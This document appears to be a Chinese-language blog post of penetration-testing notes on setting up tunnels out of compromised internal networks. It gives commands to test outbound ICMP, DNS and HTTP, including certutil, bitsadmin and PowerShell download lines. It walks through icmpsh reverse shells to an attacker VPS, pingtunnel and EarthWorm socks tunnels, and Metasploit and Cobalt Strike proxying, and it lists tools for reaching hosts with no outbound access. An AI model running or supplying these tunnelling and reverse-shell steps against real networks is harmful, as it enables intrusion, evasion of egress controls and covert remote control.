# 内网渗透-隧道搭建

  
  
&lt;!--more--&gt;  
## 隧道搭建  
### 探测出网协议和端口  
#### 禁止出站IP  
如果目标主机设置了严格的策略，只允许主动连接公网指定IP。就没办法反弹shell了  
#### 禁止出站端口  
如果防火墙做了限制，只允许服务器访问特定端口。那么，这样的话，我们就必须得找到允许访问的端口了。  
如何探测目标允许出站的端口呢？在攻击端监听某个端口，让目标访问攻击端的端口，若攻击端出现访问记录，则说明该端口允许访问。  
- 探测出站端口的命令或工具  
- 探测端口的范围  
- 攻击端的端口请求记录  
#### 禁止出站协议  
对于禁止出站协议，需要探测目标机器允许哪些协议出网  
##### 探测ICMP协议  
```  
服务端监听ICMP流量 tcpdump icmp  
客户端ping VPS地址，查看服务端能否收到请求  
```  
VPS监听，然后ping VPS查看是否能收到监听，来判断ICMP协议是否出网。也可以直接ping一个地址，看是否有ttl值  
##### 探测DNS协议  
```  
Windows:nslookup、ping  
Linux:nslookup、dig、ping  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503111848708.png)
##### 探测HTTP协议是否出网  
```  
Linux系统可以使用curl命令  
	curl http://192.168.10.13  
Windows系统可以使用如下命令  
	certutil -urlcache -split -f http://192.168.10.13  
	bitsadmin /transfer test http://192.168.10.13 c:\1  
	powershell iwr -Uri http://192.168.10.13/1 -OutFile 1 -UseBacicParsing  
```  
## icmp协议出网  
ICMP隧道简单实用，是一个比较特殊的协议。在一般的通信协议里，如果两台设备要进行通信，肯定需要开放端口，而在ICMP协议下就不需要。最常见的ping命令就是利用ICMP协议，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个ping命令都有相应的回复与请求。  
### 使用ICMP进行命令控制(Icmpsh)  
适用场景：目标机器是Windows服务器的情况  
```  
icmpsh工具  
https://github.com/bdamele/icmpsh  
```  
**VPS的操作**  
```  
#关闭icmp回复，如果要开启icmp回复，该值设置为0  
sysctl -w net.ipv4.icmp_echo_ignore_all=1  
#运行，第一个IP是VPS的eth0网卡IP，第二个IP是目标机器出口的公网IP  
python2 icmpsh_m.py ip ip  
```  
**目标机器的操作**  
`icmpsh.exe -t vpsip -d 500 -b 30 -s 128`  
- -t指定远程主机ip  
- -d请求之间的延迟，单位为毫秒，默认200  
- -b退出前的最大空格数(未应答的icmp请求)  
- -s最大数据缓冲区的字节大小(默认值为64)  
成功反弹shell  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503112043612.png)
### PingTunnel搭建隧道  
pingtunnel是一款把tcp/udp/socks5流量伪装成icmp流量进行转发的工具。  
https://github.com/esrrhs/pingtunnel  
### 正向socks5代理  
```  
#关闭icmp回复，如果要开启icmp回复，该值设置为0  
sysctl -w net.ipv4.icmp_echo_ignore_all=1  
#监听  
./pingtunnel -type server -noprint 1 -nolog 1  
```  
客户端操作  
```  
pingtunnel.exe -type client -l :1080 -s vpsip -socks5 1 -noprint 1 -nolog 1  
```  
### 端口转发  
服务端操作  
```  
#关闭icmp回复，如果要开启icmp回复，该值设置为0  
sysctl -w net.ipv4.icmp_echo_ignore_all=1  
#监听  
./pingtunnel -type server -noprint 1 -nolog 1  
```  
客户端操作  
```  
#将目标主机的8081端口转发到本地的8080端口  
pingtunnel.exe -type client -l :8080 -s 目标主机ip -t 目标主机ip:8081 -tcp 1 -noprint 1 -nolog 1  
```  
访问本地的8080端口就相当于访问目标主机的8081端口  
## 目标不出网  
### Neo-reGeorg的使用  
https://github.com/L-codes/Neo-reGeorg/  
### ABPTTS的使用  
一款基与SSL加密的HTTP端口转发工具，全程通信数据加密，比reGerog都要稳定。使用python2编写，但是该工具只支持aspx和jsp脚本的网站  
https://github.com/nccgroup/ABPTTS  
### reDuh的使用  
reDuh是一款将TCP流量封装在HTTP流量中的工具  
https://github.com/sensepost/reDuh  
### 不出网上线CS  
假如我们打下一台目标机器10.211.53.3，但是该机器不出网，我们现在想让其上线CS。我们的思路如下，通过配置代理，让本地虚拟机10.211.55.7可以访问到目标机器，然后让本地虚拟机上线cs，走bind_tcp去连接目标服务器。  
## 目标出网  
### FRP使用  
https://github.com/fatedier/frp  
### nps使用  
https://github.com/ehang-io/nps  
### ew使用  
https://rootkiter.com/EarthWorm/  
https://github.com/idlefire/ew  
#### 正向代理  
`./ew -s ssocksd -l 1080`  
#### 反向代理  
**VPS**  
将1080端口监听的流量都转发到8889端口  
`./ew -s rcsocks -l 1090 -e 8889`  
**目标机器**  
将本地的所有流量都转发到目标机器的8889端口  
`./ew -s rssocks -d vpsip -e 8889`  
### Venom  
Venom是一款Go开发的多级代理工具。  
https://github.com/Dliv3/Venom  
### MSF搭建socks代理  
`auxiliary/server/socks_proxy`模块来搭建socks代理。  
#### 添加路由  
在使用代理之前，需要先添加路由  
这里的1是Session ID  
```  
#添加路由  
route add 内网IP 255.255.255.255 1  
#查看路由  
route print  
```  
### CS搭建socks代理  
`socks 1080`  
### 端口复用  
端口复用就是在一个开放的端口上，通过对输入的信息进行字符匹配，来运行不同的服务。端口复用只对输入的信息进行字符匹配，不对网络数据进行任何拦截、复制类操作，所以对网络数据的传输性能丝毫不受影响。端口复用常被黑客用来制作后门。  
  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/  

